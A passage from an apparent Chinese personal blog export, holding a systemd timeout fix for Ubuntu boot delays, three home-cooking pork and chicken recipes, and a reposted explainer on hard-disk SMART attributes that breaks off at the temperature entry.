[{"title":"修复ubuntu 'A start job is running for wait for network to be Configured'","url":"/20220524/77996c4003a0/","content":"\n文章转载自：[Ubuntu18.4 开机卡“A start job is running for wait for network to be Configured”的解决方法](https://blog.csdn.net/baidu_19452317/article/details/99297399)\n\n\n## 现象：\n装了ubuntu server 20.04后，开机总会卡在\"A start job is running for wait for network to be Configured\"等待，时长可长达3-5min。\n\n## 解决办法\n进入系统后，修改 /etc/systemd/system/network-online.target.wants/systemd-networkd-wait-online.service 文件\n\n> sudo vim /etc/systemd/system/network-online.target.wants/systemd-networkd-wait-online.service\n\n在 [Service] 下，增加一句，\n```\nTimeoutStartSec=3sec\n```\n规定超时时间为3s，避免无限等待。如果还有其他网络连接问题的话，修改另外两个文件的Timeout时间就可以了。","tags":["Ubuntu"],"categories":["运维"]},{"title":"日常红烧排骨","url":"/20220424/7ebcdbfbc228/","content":"\n红烧排骨口感好，做起来也比较简单，略耗时，约30-40min，但期间需要的操作比较少，可以放心的做其他事情。\n\n## 必备原料和工具\n\n- 排骨\n- 食用油\n- 八角\n- 姜\n- 蒜\n- 冰糖\n- 老抽\n- 生抽\n- 料酒\n- 盐\n\n## 计算\n\n每次制作前需要确定计划做几份。一份正好够 2 个人吃。\n\n每份：\n\n- 排骨 500g\n- 食用油 10g\n- 八角 10g\n- 姜 20g\n- 蒜 20g\n- 冰糖 10-15g\n- 老抽 2-4ml\n- 生抽 5-10ml\n- 料酒 50ml\n- 盐 5g\n\n调料可按个人口味酌情调整\n\n## 操作\n\n- 排骨让摊贩剁好，成块状，姜切片备用\n- 用清水冲洗排骨2-3次，清洗掉血水\n- 冷水排骨下锅，没过排骨的程度即可，沸腾1min左右撇去浮沫，捞起排骨备用\n- 倒入食用油，小伙（燃气灶调到最小），放入冰糖，翻炒至完全融化，冰糖呈棕色\n- 倒入排骨，翻炒至颜色均匀\n- 开中火倒入料酒、老抽、生炒，翻炒均匀\n- 倒入清水，没过2/3的排骨高度即可，放入蒜、姜、八角、盐，维持中火炖20-30min，或至汤汁收到接近完全干掉\n  \n\n## 附加内容\n\n- 操作时，应注意翻炒排骨防止粘锅。","tags":["做菜"],"categories":["日常"]},{"title":"砂锅红烧肉","url":"/20220407/50c4064f395f/","content":"\n<!-- 在这里简单介绍菜的特点、营养价值、难度、预计制作时长。 -->\n砂锅红烧肉简单易做，但比较耗时，预计耗时1-2h，好吃是真的好吃（迫真）。\n\n## 必备原料和工具\n\n- 砂锅\n- 五花肉\n- 食用油\n- 八角\n- 冰糖\n- 砂糖\n- 姜\n- 大蒜\n- 干辣椒\n- 老抽、生抽\n- 耗油\n- 料酒\n- 啤酒\n\n## 计算\n\n每次制作前需要确定计划做几份。一份正好够 2 个人吃。\n\n每份：\n\n- 五花肉 500g\n- 食用油 15-25g\n- 八角 10g\n- 冰糖 20g\n- 砂糖 30-50g\n- 姜 10g\n- 大蒜 10g\n- 干辣椒 5g\n- 老抽、生抽各 10g\n- 耗油 10g\n- 料酒 50-75g\n- 啤酒 330ml\n\n## 操作\n\n- 五花肉切成 `2*2cm ~ 3*3cm` 块状，冷水下炒锅，煮沸以后再煮1分钟捞出来，并用冷水冲洗\n- 炒锅里放入食用油，加入`一半的八角`和`全部的辣椒`小火炒香，加入`一半的姜`和`全部的蒜`，大火爆香\n- 放入五花肉，翻炒均匀后捞出\n- 砂锅里放白糖和油，用中火慢慢把白糖炒融化掉，变成棕色改小火\n- 加入五花肉迅速翻炒均匀\n- 加入啤酒和料酒，不足没过食材时可加入更多的啤酒\n- 加入`剩余的姜片、八角`、酱油和蚝油炖2个小时\n- 出锅前加入冰糖煮化，然后加入盐调味即可\n\n## 附加内容\n\n<!-- 在这里额外补充一些注意事项、参考资料、安全须知等。 -->\n\n- 需要实时注意观察沸腾的水位线，如发现低于 2/3 的食材应加热水至没过食材。\n- 参考资料：[砂锅红烧肉](https://home.meishichina.com/recipe-79192.html)","tags":["做菜"],"categories":["日常"]},{"title":"爽滑鸡胸肉","url":"/20220406/7681a3ce1e53/","content":"\n<!-- 在这里简单介绍菜的特点、营养价值、难度、预计制作时长。 -->\n鸡胸肉做起来简单快速，成本较低，基本在10min内即可完成，同时非常顶饱，一份差不多满足2人吃。\n\n## 必备原料和工具\n\n- 鸡胸肉（冰箱里可以多屯点）\n- 花生油/芝麻油\n- 生抽\n- 料酒\n- 胡椒粉\n- 盐\n\n## 计算\n\n每份：\n\n- 鸡胸肉 300g\n- 花生油/芝麻油  5-10ml\n- 生抽 3-6ml\n- 料酒 15-30ml\n- 胡椒粉 3g\n- 盐 5g\n\n## 操作\n\n<!-- 在这里详细描述做菜的全部流程。 -->\n<!-- 不允许使用不精准描述的词汇，例如：`适 量`、`少 量`、`中 量`、`适 当`。 -->\n<!-- 在这里，如果操作的食材不是“全部食材”而是“部分食材”，也必须指明。否则默认指定的是全部原料。例如这里‘土豆’表示‘全部准备好的土豆’。 -->\n\n- 鸡胸肉解冻，切成不大于`5*3*3cm`的块状\n- 将鸡胸肉、胡椒粉、生抽、料酒、盐全部加入碗中，揉捏鸡胸肉使其与调料充分混合，静置腌制15min\n- 热锅，大火，加入花生油/芝麻油，等待15s，晃动锅使油均匀分布在锅底\n- 直接倒入腌制好的鸡胸肉，调整至中火，翻炒越5min，至所有鸡胸肉块变色即可\n\n## 附加内容\n\n<!-- 在这里额外补充一些注意事项、参考资料、安全须知等。 -->\n\n- 可以根据个人喜好增加生抽、料酒、老抽、胡椒粉等调料","tags":["做菜"],"categories":["日常"]},{"title":"硬盘SMART检测参数详解","url":"/20210518/d37066f8ba29/","content":"\n本文转自：https://www.cnblogs.com/xqzt/p/5512075.html\n\n### **一、SMART概述**\n\n​    要说Linux用户最不愿意看到的事情，莫过于在毫无警告的情况下发现硬盘崩溃了。诸如RAID的备份和存储技术可以在任何时候帮用户恢复数据，但为预防硬件崩溃造成数据丢失所花费的代价却是相当可观的，特别是在用户从来没有提前考虑过在这些情况下的应对措施时。\n\n硬盘的故障一般分为两种：可预测的（predictable）和不可预测的（unpredictable）。后者偶而会发生，也没有办法去预防它，例如芯片突然失效，机械撞击等。但像电机轴承磨损、盘片磁介质性能下降等都属于可预测的情况，可以在在几天甚至几星期前就发现这种不正常的现象。\n\n​    对于可预测的情况，如果能通过磁盘监控技术，通过测量硬盘的几个重要的安全参数和评估他们的情况，然后由监控软件得出两种结果：“硬盘安全”或“不久后会发生故障”。那么在发生故障前，至少有足够的时间让使用者把重要资料转移到其它储存设备上。\n\n最早期的硬盘监控技术起源于1992年，IBM在AS/400计算机的IBM 0662 SCSI 2代硬盘驱动器中使用了后来被命名为Predictive Failure Analysis（故障预警分析技术）的监控技术，它是通过在固件中测量几个重要的硬盘安全参数和评估他们的情况，然后由监控软件得出两种结果：“硬盘安全”或“不久后会发生故障”。\n\n不久，当时的微机制造商康柏和硬盘制造商希捷、昆腾以及康纳共同提出了名为IntelliSafe的类似技术。通过该技术，硬盘可以测量自身的的健康指标并将参量值传送给操作系统和用户的监控软件中，每个硬盘生产商有权决定哪些指标需要被监控以及设定它们的安全阈值。\n\n1995年，康柏公司将该技术方案提交到Small Form Factor(SFF)委员会进行标准化，该方案得到IBM、希捷、昆腾、康纳和西部数据的支持，1996年6月进行了1.3版的修正，正式更名为S.M.A.R.T.（Self-Monitoring Analysis And Reporting Technology），全称就是“自我检测分析与报告技术”，成为一种自动监控硬盘驱动器完好状况和报告潜在问题的技术标准。\n\nSMART的目的是监控硬盘的可靠性、预测磁盘故障和执行各种类型的磁盘自检。如今大部分的ATA/SATA、SCSI/SAS和固态硬盘都搭载内置的SMART系统。作为行业规范，SMART规定了硬盘制造厂商应遵循的标准，满足SMART标准的条件主要包括：\n\n1）在设备制造期间完成SMART需要的各项参数、属性的设定；\n\n2）在特定系统平台下，能够正常使用SMART；通过BIOS检测，能够识别设备是否支持SMART并可显示相关信息，而且能辨别有效和失效的SMART信息；\n\n3）允许用户自由开启和关闭SMART功能；\n\n4）在用户使用过程中，能提供SMART的各项有效信息，确定设备的工作状态，并能发出相应的修正指令或警告。在硬盘及操作系统都支持SMART技术并且开启的情况下，若硬盘状态不良，SMART功能会在开机时响起警报，SMART技术能够在屏幕上显示英文警告信息：“WARNING IMMEDIATLY BACKUP YOUR DATA AND REPLACE YOUR HARD DISK DRIVE，A FAILURE MAY BE IMMINENT．”(警告：立刻备份你的数据并更换硬盘，硬盘可能失效。) \n\nSMART功能不断从硬盘上的各个传感器收集信息，并把信息保存在硬盘的系统保留区(service area)内，这个区域一般位于硬盘0物理面的最前面几十个物理磁道，由厂商写入相关的内部管理程序。这里除了SMART信息表外还包括低级格式化程序、加密解密程序、自监控程序、自动修复程序等。用户使用的监测软件通过名为“SMART Return Status”的命令（命令代码为：B0h）对SMART信息进行读取，且不允许最终用户对信息进行修改。\n\nsmartmontools是smart的的软件包程序，由smartctl和smartd两部分工具程序组成，它们一起为Linux平台提供对磁盘退化和故障的高级警告。\n\n### **二、smart信息解读**\n\n![01](01.png)\n\n#### **ID**\n\n属性ID，通常是一个1到255之间的十进制或十六进制的数字。硬盘SMART检测的ID代码以两位十六进制数表示（括号里对应的是十进制数）硬盘的各项检测参数。目前，各硬盘制造商的绝大部分SMART ID代码所代表的参数含义是一致的，但厂商也可以根据需要使用不同的ID代码，或者根据检测项目的多少增减ID代码。一般来说，以下这些检测项是必需的： \n\n```\n01（001） Raw_Read_Error_Rate 底层数据读取错误率 \n04（004） Start_Stop_Count 启动/停止计数 \n05（005） Reallocated_Sector_Ct 重映射扇区数 \n09（009） Power_On_Hours 通电时间累计，出厂后通电的总时间，一般磁盘寿命三万小时 \n0A（010） Spin_Retry_Count 主轴起旋重试次数（即硬盘主轴电机启动重试次数） \n0B（011） Calibration_Retry_Count 磁盘校准重试次数 \n0C（012） Power_Cycle_Count 磁盘通电次数 \nC2（194） Temperature_Celsius 温度 \nC7（199） UDMA_CRC_Error_Count 奇偶校验错误率 \nC8（200） Write_Error_Rate: 写错误率 \nF1（241） Total_LBAs_Written：表示磁盘自出厂总共写入的的数据，单位是LBAS=512Byte \nF2（242） Total_LBAs_Read：表示磁盘自出厂总共读取的数据，单位是LBAS=512Byte \n```\n\n#### **ATTRIBUTE_NAME**\n\n硬盘制造商定义的属性名。，即某一检测项目的名称，是ID代码的文字解释。\n\n#### **FLAG**\n\n属性操作标志（可以忽略）\n\n#### *当前值（value）* \n\n当前值是各ID项在硬盘运行时根据实测原始数据（Raw value）通过公式计算的结果，1到253之间。253意味着最好情况，1意味着最坏情况。计算公式由硬盘厂家自定。 \n\n硬盘出厂时各ID项目都有一个预设的最大正常值，也即出厂值，这个预设的依据及计算方法为硬盘厂家保密，不同型号的硬盘都不同，最大正常值通常为100或200或253，新硬盘刚开始使用时显示的当前值可以认为是预设的最大正常值（有些ID项如温度等除外）。随着使用损耗或出现错误，当前值会根据实测数据而不断刷新并逐渐减小。因此，当前值接近临界值就意味着硬盘寿命的减少，发生故障的可能性增大，所以当前值也是判定硬盘健康状态或推测寿命的依据之一。\n\n#### **最差值（Worst）**\n\n最差值是硬盘运行时各ID项曾出现过的最小的value。 \n 最差值是对硬盘运行中某项数据变劣的峰值统计，该数值也会不断刷新。通常，最差值与当前值是相等的，如果最差值出现较大的波动（小于当前值），表明硬盘曾出现错误或曾经历过恶劣的工作环境（如温度）。\n\n#### **临界值（Threshold）** \n\n在报告硬盘FAILED状态前，WORST可以允许的最小值。\n\n临界值是硬盘厂商指定的表示某一项目可靠性的门限值，也称阈值，它通过特定公式计算而得。如果某个参数的当前值接近了临界值，就意味着硬盘将变得不可靠，可能导致数据丢失或者硬盘故障。由于临界值是硬盘厂商根据自己产品特性而确定的，因此用厂商提供的专用检测软件往往会跟Windows下检测软件的检测结果有较大出入。 \n \n\n硬盘的每项SMART信息中都有一个临界值（阈值），不同硬盘的临界值是不同的，SMART针对各项的当前值、最差值和临界值的比较结果以及数据值进行分析后，提供硬盘当前的评估状态，也是我们直观判断硬盘健康状态的重要信息。根据SMART的规定，状态一般有正常、警告、故障或错误三种状态。\n\nSMART判定这三个状态与SMART的 Pre-failure/advisory BIT（预测错误/发现位）参数的赋值密切相关，当Pre-failure/advisory BIT=0，并且当前值、最差值远大于临界值的情况下，为正常标志。当Pre-failure/advisory BIT=0，并且当前值、最差值大于但接近临界值时，为警告标志；当Pre-failure/advisory BIT=1，并且当前值、最差值小于临界值时，为故障或错误标志\n\n#### **原始值(RAW_VALUE)**\n\n制造商定义的原始值，从VALUE派生。\n\n数据值是硬盘运行时各项参数的实测值，大部分SMART工具以十进制显示数据。 \n 数据值代表的意义随参数而定，大致可以分为三类： \n 1）数据值并不直接反映硬盘状态，必须经过硬盘内置的计算公式换算成当前值才能得出结果； \n 2）数据值是直接累计的，如Start/Stop Count（启动/停止计数）的数据是50，即表示该硬盘从出厂到现在累计启停了50次； \n 3）有些参数的数据是即时数，如Temperature（温度）的数据值是44，表示硬盘的当前温度是44℃。 \n 因此，有些参数直接查看数据也能大致了解硬盘目前的工作状态。\n\n#### **TYPE**\n\n属性的类型（Pre-fail或Oldage）。Pre-fail类型的属性可被看成一个关键属性，表示参与磁盘的整体SMART健康评估（PASSED/FAILED）。如果任何Pre-fail类型的属性故障，那么可视为磁盘将要发生故障。另一方面，Oldage类型的属性可被看成一个非关键的属性（如正常的磁盘磨损），表示不会使磁盘本身发生故障。\n\n#### **UPDATED**\n\n表示属性的更新频率。Offline代表磁盘上执行离线测试的时间。\n\n#### **WHEN_FAILED**\n\n如果VALUE小于等于THRESH，会被设置成“FAILING_NOW”；如果WORST小于等于THRESH会被设置成“In_the_past”；如果都不是，会被设置成“-”。在“FAILING_NOW”情况下，需要尽快备份重要 文件，特别是属性是Pre-fail类型时。“In_the_past”代表属性已经故障了，但在运行测试的时候没问题。“-”代表这个属性从没故障过。\n\n### **三、SMART参数详解**\n\n一般情况下，用户只要观察当前值、最差值和临界值的关系，并注意状态提示信息即可大致了解硬盘的健康状况。下面简单介绍各参数的含义，以红色标出的项目是寿命关键项，蓝色为固态硬盘（SSD）特有的项目。 \n 在基于闪存的固态硬盘中，存储单元分为两类：SLC（Single Layer Cell，单层单元）和MLC（Multi-Level Cell，多层单元）。SLC成本高、容量小、但读写速度快，可靠性高，擦写次数可高达100000次，比MLC高10倍。而MLC虽容量大、成本低，但其性能大幅落后于SLC。为了保证MLC的寿命，控制芯片还要有智能磨损平衡技术算法，使每个存储单元的写入次数可以平均分摊，以达到100万小时的平均无故障时间。因此固态硬盘有许多SMART参数是机械硬盘所没有的，如存储单元的擦写次数、备用块统计等等，这些新增项大都由厂家自定义，有些尚无详细的解释，有些解释也未必准确，此处也只是仅供参考。下面凡未注明厂商的固态硬盘特有的项均为SandForce主控芯片特有的，其它厂商各自单独注明。\n\n**01（001）底层数据读取错误率 Raw Read Error Rate** \n 数据为0或任意值，当前值应远大于与临界值。 \n 底层数据读取错误率是磁头从磁盘表面读取数据时出现的错误，对某些硬盘来说，大于0的数据表明磁盘表面或者读写磁头发生问题，如介质损伤、磁头污染、磁头共振等等。不过对希捷硬盘来说，许多硬盘的这一项会有很大的数据量，这不代表有任何问题，主要是看当前值下降的程度。 \n 在固态硬盘中，此项的数据值包含了可校正的错误与不可校正的RAISE错误（UECC＋URAISE）。\n\n注：RAISE（Redundant Array of Independent Silicon Elements）意为独立硅元素冗余阵列，是固态硬盘特有的一种冗余恢复技术，保证内部有类似RAID阵列的数据安全性。\n\n**02（002）磁盘读写通量性能 Throughput Performance** \n 此参数表示硬盘的读写通量性能，数据值越大越好。当前值如果偏低或趋近临界值，表示硬盘存在严重的问题，但现在的硬盘通常显示数据值为0或根本不显示此项，一般在进行了人工脱机SMART测试后才会有数据量。\n\n**03（003）主轴起旋时间 Spin Up Time** \n 主轴起旋时间就是主轴电机从启动至达到额定转速所用的时间，数据值直接显示时间，单位为毫秒或者秒，因此数据值越小越好。不过对于正常硬盘来说，这一项仅仅是一个参考值，硬盘每次的启动时间都不相同，某次启动的稍慢些也不表示就有问题。 \n 硬盘的主轴电机从启动至达到额定转速大致需要4秒～15秒左右，过长的启动时间说明电机驱动电路或者轴承机构有问题。旦这一参数的数据值在某些型号的硬盘上总是为0，这就要看当前值和最差值来判断了。 \n 对于固态硬盘来说，所有的数据都是保存在半导体集成电路中，没有主轴电机，所以这项没有意义，数据固定为0，当前值固定为100。\n\n**04（004）启停计数 Start/Stop Count** \n 这一参数的数据是累计值，表示硬盘主轴电机启动/停止的次数，新硬盘通常只有几次，以后会逐渐增加。系统的某些功能如空闲时关闭硬盘等会使硬盘启动/停止的次数大为增加，在排除定时功能的影响下，过高的启动/停止次数（远大于通电次数0C）暗示硬盘电机及其驱动电路可能有问题。 \n 这个参数的当前值是依据某种公式计算的结果，例如对希捷某硬盘来说临界值为20，当前值是通过公式“100－（启停计数/1024）”计算得出的。若新硬盘的启停计数为0，当前值为100－(0/1024)＝100，随着启停次数的增加，该值不断下降，当启停次数达到81920次时，当前值为100－(81920/1024)＝20，已达到临界值，表示从启停次数来看，该硬盘已达设计寿命，当然这只是个寿命参考值，并不具有确定的指标性。 \n 这一项对于固态硬盘同样没有意义，数据固定为0，当前值固定为100。\n\n**05（005）重映射扇区计数 Reallocated Sectors Count/ 退役块计数 Retired Block Count** \n 数据应为0，当前值应远大于临界值。 \n 当硬盘的某扇区持续出现读/写/校验错误时，硬盘固件程序会将这个扇区的物理地址加入缺陷表(G-list)，将该地址重新定向到预先保留的备用扇区并将其中的数据一并转移，这就称为重映射。执行重映射操作后的硬盘在Windows常规检测中是无法发现不良扇区的，因其地址已被指向备用扇区，这等于屏蔽了不良扇区。 \n 这项参数的数据值直接表示已经被重映射扇区的数量，当前值则随着数据值的增加而持续下降。当发现此项的数据值不为零时，要密切注意其发展趋势，若能长期保持稳定，则硬盘还可以正常运行；若数据值不断上升，说明不良扇区不断增加，硬盘已处于不稳定状态，应当考虑更换了。如果当前值接近或已到达临界值（此时的数据值并不一定很大，因为不同硬盘保留的备用扇区数并不相同），表示缺陷表已满或备用扇区已用尽，已经失去了重映射功能，再出现不良扇区就会显现出来并直接导致数据丢失。 \n 这一项不仅是硬盘的寿命关键参数，而且重映射扇区的数量也直接影响硬盘的性能，例如某些硬盘会出现数据量很大，但当前值下降不明显的情况，这种硬盘尽管还可正常运行，但也不宜继续使用。因为备用扇区都是位于磁盘尾部（靠近盘片轴心处），大量的使用备用扇区会使寻道时间增加，硬盘性能明显下降。 \n 这个参数在机械硬盘上是非常敏感的，而对于固态硬盘来说同样具有重要意义。闪存的寿命是正态分布的，例如说MLC能写入一万次以上，实际上说的是写入一万次之前不会发生“批量损坏”，但某些单元可能写入几十次就损坏了。换言之，机械硬盘的盘片不会因读写而损坏，出现不良扇区大多与工艺质量相关，而闪存的读写次数则是有限的，因而损坏是正常的。所以固态硬盘在制造时也保留了一定的空间，当某个存储单元出现问题后即把损坏的部分隔离，用好的部分来顶替。这一替换方法和机械硬盘的扇区重映射是一个道理，只不过机械硬盘正常时极少有重映射操作，而对于固态硬盘是经常性的。 \n 在固态硬盘中这一项的数据会随着使用而不断增长，只要增长的速度保持稳定就可以。通常情况下，数据值＝100－（100×被替换块/必需块总数），因此也可以估算出硬盘的剩余寿命。 \n Intel固态硬盘型号的第十二个字母表示了两种规格，该字母为1表示第一代的50纳米技术的SSD，为2表示第二代的34纳米技术的SSD，如SSDSA2M160G2GN就表示是34nm的SSD。所以参数的查看也有两种情况： \n 50nm的SSD（一代）要看当前值。这个值初始是100，当出现替换块的时候这个值并不会立即变化，一直到已替换四个块时这个值变为1，之后每增加四个块当前值就＋1。也就是100对应0～3个块，1对应4～7个块，2对应8～11个块…… \n 34nm的SSD（二代）直接查看数据值，数据值直接表示有多少个被替换的块。\n\n**06（006）读取通道余量 Read Channel Margin** \n 这一项功能不明，现在的硬盘也不显示这一项。\n\n**07（007）寻道错误率 Seek Error Rate** \n 数据应为0，当前值应远大于与临界值。 \n 这一项表示磁头寻道时的错误率，有众多因素可导致寻道错误率上升，如磁头组件的机械系统、伺服电路有局部问题，盘片表面介质不良，硬盘温度过高等等。 \n 通常此项的数据应为0，但对希捷硬盘来说，即使是新硬盘，这一项也可能有很大的数据量，这不代表有任何问题，还是要看当前值是否下降。\n\n**08（008）寻道性能 Seek Time Performance** \n 此项表示硬盘寻道操作的平均性能（寻道速度），通常与前一项（寻道错误率）相关联。当前值持续下降标志着磁头组件、寻道电机或伺服电路出现问题，但现在许多硬盘并不显示这一项。\n\n**09（009）通电时间累计 Power-On Time Count (POH)** \n 这个参数的含义一目了然，表示硬盘通电的时间，数据值直接累计了设备通电的时长，新硬盘当然应该接近0，但不同硬盘的计数单位有所不同，有以小时计数的，也有以分、秒甚至30秒为单位的，这由磁盘制造商来定义。 \n 这一参数的临界值通常为0，当前值随着硬盘通电时间增加会逐渐下降，接近临界值表明硬盘已接近预计的设计寿命，当然这并不表明硬盘将出现故障或立即报废。参考磁盘制造商给出的该型号硬盘的MTBF（平均无故障时间）值，可以大致估计剩余寿命或故障概率。 \n 对于固态硬盘，要注意“设备优先电源管理功能（device initiated power management，DIPM）”会影响这个统计：如果启用了DIPM，持续通电计数里就不包括睡眠时间；如果关闭了DIPM功能，那么活动、空闲和睡眠三种状态的时间都会被统计在内。\n\n**0A（010）主轴起旋重试次数 Spin up Retry Count** \n 数据应为0，当前值应大于临界值。 \n 主轴起旋重试次数的数据值就是主轴电机尝试重新启动的计数，即主轴电机启动后在规定的时间里未能成功达到额定转速而尝试再次启动的次数。数据量的增加表示电机驱动电路或是机械子系统出现问题，整机供电不足也会导致这一问题。\n\n**0B（011）磁头校准重试计数 Calibration Retry Count** \n 数据应为0，当前值应远大于与临界值。 \n 硬盘在温度发生变化时，机械部件（特别是盘片）会因热胀冷缩出现形变，因此需要执行磁头校准操作消除误差，有的硬盘还内置了磁头定时校准功能。这一项记录了需要再次校准（通常因上次校准失败）的次数。 \n 这一项的数据量增加，表示电机驱动电路或是机械子系统出现问题，但有些型号的新硬盘也有一定的数据量，并不表示有问题，还要看当前值和最差值。\n\n**0C（012）通电周期计数 Power Cycle Count** \n 通电周期计数的数据值表示了硬盘通电/断电的次数，即电源开关次数的累计，新硬盘通常只有几次。 \n 这一项与启停计数（04）是有区别的，一般来说，硬盘通电/断电意味着计算机的开机与关机，所以经历一次开关机数据才会加1；而启停计数（04）表示硬盘主轴电机的启动/停止（硬盘在运行时可能多次启停，如系统进入休眠或被设置为空闲多少时间而关闭）。所以大多情况下这个通电/断电的次数会小于启停计数（04）的次数。\n\n通常，硬盘设计的通电次数都很高，如至少5000次，因此这一计数只是寿命参考值，本身不具指标性。\n\n**0D（013）软件读取错误率 Soft Read Error Rate** \n 软件读取错误率也称为可校正的读取误码率，就是报告给操作系统的未经校正的读取错误。数据值越低越好，过高则可能暗示盘片磁介质有问题。\n\n**AA（170）坏块增长计数 Grown Failing Block Count（Micron 镁光）** \n 读写失败的块增长的总数。\n\n**AB（171）编程失败块计数 Program Fail Block Count** \n Flash编程失败块的数量。\n\n**AC（172）擦写失败块计数 Erase Fail Block Count** \n 擦写失败块的数量。\n\n**AD（173）磨损平衡操作次数（平均擦写次数） / Wear Leveling Count（Micron 镁光）** \n 所有好块的平均擦写次数。 \n Flash芯片有写入次数限制，当使用FAT文件系统时，需要频繁地更新文件分配表。如果闪存的某些区域读写过于频繁，就会比其它区域磨损的更快，这将明显缩短整个硬盘的寿命（即便其它区域的擦写次数还远小于最大限制）。所以，如果让整个区域具有均匀的写入量，就可明显延长芯片寿命，这称为磨损均衡措施。\n\n**AE（174）意外失电计数 Unexpected Power Loss Count** \n 硬盘自启用后发生意外断电事件的次数。\n\n**B1（177）磨损范围对比值 Wear Range Delta** \n 磨损最重的块与磨损最轻的块的磨损百分比之差。\n\n**B4（180）未用的备用块计数 Unused Reserved Block Count Total（惠普）** \n 固态硬盘会保留一些容量来准备替换损坏的存储单元，所以可用的预留空间数非常重要。这个参数的当前值表示的是尚未使用的预留的存储单元数量。\n\n**B5（181）编程失败计数 Program Fail Count** \n 用4个字节显示已编程失败的次数，与（AB）参数相似。\n\n**B5（181）非4KB对齐访问数 Non-4k Aligned Access（Micron 镁光）**\n\n**B6（182）擦写失败计数 Erase Fail Count** \n 用4个字节显示硬盘自启用后块擦写失败的次数，与（AC）参数相似。\n\n**B7（183）串口降速错误计数 SATA Downshift Error Count** \n 这一项表示了SATA接口速率错误下降的次数。通常硬盘与主板之间的兼容问题会导致SATA传输级别降级运行。\n\n**B8（184）I/O错误检测与校正 I/O Error Detection and Correction（IOEDC）** \n “I/O错误检测与校正”是惠普公司专有的SMART IV技术的一部分，与其他制造商的I/O错误检测和校正架构一样，它记录了数据通过驱动器内部高速缓存RAM传输到主机时的奇偶校验错误数量。 \n B8（184）点到点错误检测计数 End to End Error Detection Count \n Intel第二代的34nm固态硬盘有点到点错误检测计数这一项。固态硬盘里有一个LBA（logical block addressing，逻辑块地址）记录，这一项显示了SSD内部逻辑块地址与真实物理地址间映射的出错次数。 \n B8（184）原始坏块数 Init Bad Block Count（Indilinx芯片） \n 硬盘出厂时已有的坏块数量。\n\n**B9（185）磁头稳定性 Head Stability（西部数据）** \n 意义不明。\n\n**BA（186）感应运算振动检测 nduced Op-Vibration Detection（西部数据）** \n 意义不明。\n\n**BB（187）无法校正的错误 Reported Uncorrectable Errors（希捷）** \n 报告给操作系统的无法通过硬件ECC校正的错误。如果数据值不为零，就应该备份硬盘上的数据了。 \n 报告给操作系统的在所有存取命令中出现的无法校正的RAISE（URAISE）错误。\n\n**BC（188）命令超时 Command Timeout** \n 由于硬盘超时导致操作终止的次数。通常数据值应为0，如果远大于零，最有可能出现的是电源供电问题或者数据线氧化致使接触不良，也可能是硬盘出现严重问题。\n\n**BD（189）高飞写入 High Fly Writes** \n 磁头飞行高度监视装置可以提高读写的可靠性，这一装置时刻监测磁头的飞行高度是否在正常范围来保证可靠的写入数据。如果磁头的飞行高度出现偏差，写入操作就会停止，然后尝试重新写入或者换一个位置写入。这种持续的监测过程提高了写入数据的可靠性，同时也降低了读取错误率。这一项的数据值就统计了写入时磁头飞行高度出现偏差的次数。\n\n**BD（189）出厂坏块计数 Factory Bad Block Count（Micron 镁光芯片）**\n\n**BE（190）气流温度 Airflow Temperature** \n 这一项表示的是硬盘内部盘片表面的气流温度。在希捷公司的某些硬盘中，当前值=（100－当前温度），因此气流温度越高，当前值就越低，最差值则是当前值曾经到达过的最低点，临界值由制造商定义的最高允许温度来确定，而数据值不具实际意义。许多硬盘也没有这一项参数。\n\n**BF（191）冲击错误率 G-sense error rate** \n 这一项的数据值记录了硬盘受到机械冲击导致出错的频度。\n\n**C0（192）断电返回计数 Power-Off Retract Count** \n 当计算机关机或意外断电时，硬盘的磁头都要返回停靠区，不能停留在盘片的数据区里。正常关机时电源会给硬盘一个通知，即Standby Immediate，就是说主机要求将缓存数据写入硬盘，然后就准备关机断电了（休眠、待机也是如此）；意外断电则表示硬盘在未收到关机通知时就失电，此时磁头会自动复位，迅速离开盘片。 \n 这个参数的数据值累计了磁头返回的次数。但要注意这个参数对某些硬盘来说仅记录意外断电时磁头的返回动作；而某些硬盘记录了所有（包括休眠、待机，但不包括关机时）的磁头返回动作；还有些硬盘这一项没有记录。因此这一参数的数据值在某些硬盘上持续为0或稍大于0，但在另外的硬盘上则会大于通电周期计数（0C）或启停计数（04）的数据。在一些新型节能硬盘中，这一参数的数据量还与硬盘的节能设计相关，可能会远大于通电周期计数（0C）或启停计数（04）的数据，但又远小于磁头加载/卸载计数（C1）的数据量。 \n 对于固态硬盘来说，虽然没有磁头的加载/卸载操作，但这一项的数据量仍然代表了不安全关机，即发生意外断电的次数。\n\n**C1（193）磁头加载/卸载计数 Load/Unload Cycle Count** \n 对于过去的硬盘来说，盘片停止旋转时磁头臂停靠于盘片中心轴处的停泊区，磁头与盘片接触，只有当盘片旋转到一定转速时，磁头才开始漂浮于盘片之上并开始向外侧移动至数据区。这使得磁头在硬盘启停时都与盘片发生摩擦，虽然盘片的停泊区不存储数据，但无疑启停一个循环，就使磁头经历两次磨损。所以对以前的硬盘来说，磁头起降（加载/卸载）次数是一项重要的寿命关键参数。\n\n而在现代硬盘中，平时磁头臂是停靠于盘片之外的一个专门设计的停靠架上，远离盘片。只有当盘片旋转达到额定转速后，磁头臂才开始向内（盘片轴心）转动使磁头移至盘片区域（加载），磁头臂向外转动返回至停靠架即卸载。这样就彻底杜绝了硬盘启停时磁头与盘片接触的现象，西部数据公司将其称为“斜坡加载技术”。由于磁头在加载/卸载过程中始终不与盘片接触，不存在磁头的磨损，使得这一参数的重要性已经大大下降。\n\n这个参数的数据值就是磁头执行加载/卸载操作的累计次数。从原理上讲，这个加载/卸载次数应当与硬盘的启停次数相当，但对于笔记本内置硬盘以及台式机新型节能硬盘来说，这一项的数据量会很大。这是因为磁头臂组件设计有一个固定的返回力矩，保证在意外断电时磁头能靠弹簧力自动离开盘片半径范围，迅速返回停靠架。所以要让硬盘运行时磁头保持在盘片的半径之内，就要使磁头臂驱动电机（寻道电机）持续通以电流。而让磁头臂在硬盘空闲几分钟后就立即执行卸载动作，返回到停靠架上，既有利于节能，又降低了硬盘受外力冲击导致磁头与盘片接触的概率。虽然再次加载会增加一点寻道时间，但毕竟弊大于利，所以在这类硬盘中磁头的加载/卸载次数会远远大于通电周期计数（0C）或启停计数（04）的数据量。不过这种加载/卸载方式已经没有了磁头与盘片的接触，所以设计值也已大大增加，通常笔记本内置硬盘的磁头加载/卸载额定值在30～60万次，而台式机新型节能硬盘的磁头加载/卸载设计值可达一百万次。\n\n**C2（194）温度 Temperature** \n 